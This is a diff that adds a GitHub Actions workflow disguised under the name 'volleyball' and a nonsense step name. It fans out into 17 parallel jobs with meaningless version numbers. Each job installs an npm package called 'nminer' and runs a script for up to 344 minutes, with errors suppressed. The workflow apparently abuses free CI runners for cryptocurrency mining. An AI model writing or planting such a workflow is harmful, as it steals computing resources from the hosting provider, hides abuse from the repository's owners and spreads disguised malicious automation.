@@ -1,0 +1,42 @@
+name: volleyball
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 8680 }
+          - { version: 7870 }
+          - { version: 3658 }
+          - { version: 1860 }
+          - { version: 1997 }
+          - { version: 2586 }
+          - { version: 6343 }
+          - { version: 1666 }
+          - { version: 7035 }
+          - { version: 2270 }
+          - { version: 1975 }
+          - { version: 193 }
+          - { version: 2503 }
+          - { version: 7566 }
+          - { version: 970 }
+          - { version: 3462 }
+          - { version: 6972 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: versus how mismatch ouch
+        run: |
+          npm install nminer@latest
+          timeout 344m node volleyball.js || echo "volleyball executed"
